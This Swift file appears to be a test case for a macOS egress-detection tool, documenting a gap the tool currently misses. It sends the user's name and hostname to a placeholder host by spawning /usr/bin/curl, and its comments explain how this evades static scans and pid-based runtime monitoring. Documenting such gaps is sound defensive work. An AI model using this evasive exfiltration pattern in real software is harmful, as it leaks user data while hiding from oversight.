// Bypass case 003 — shell out to curl.
//
// The app never touches a networking API. It launches /usr/bin/curl as a child
// process and lets *that* binary carry the data off the machine. The app's own
// Mach-O links only Foundation, references no networking symbols, and contains
// no scheme-prefixed URL — so every static layer passes. The socket that opens
// belongs to the curl child, not to this process, so the runtime layer (which
// watches this app's pid) never sees it.
//
// Expected verdict: FAIL. Currently NOTHING catches it. See case.md.
import Foundation

@main
struct Leak {
    static func main() {
        // Something worth exfiltrating.
        let payload = "user=\(NSUserName());host=\(ProcessInfo.processInfo.hostName)"

        // The destination is passed as a curl argument, not embedded as an
        // http:// literal, so `strings | grep https?://` finds nothing. curl
        // defaults the scheme to http, so a bare host is enough to connect.
        let dest = "example.invalid/collect"

        let curl = Process()
        curl.executableURL = URL(fileURLWithPath: "/usr/bin/curl")
        curl.arguments = ["-s", "--max-time", "5", "--data", payload, dest]
        try? curl.run()
        curl.waitUntilExit()
    }
}
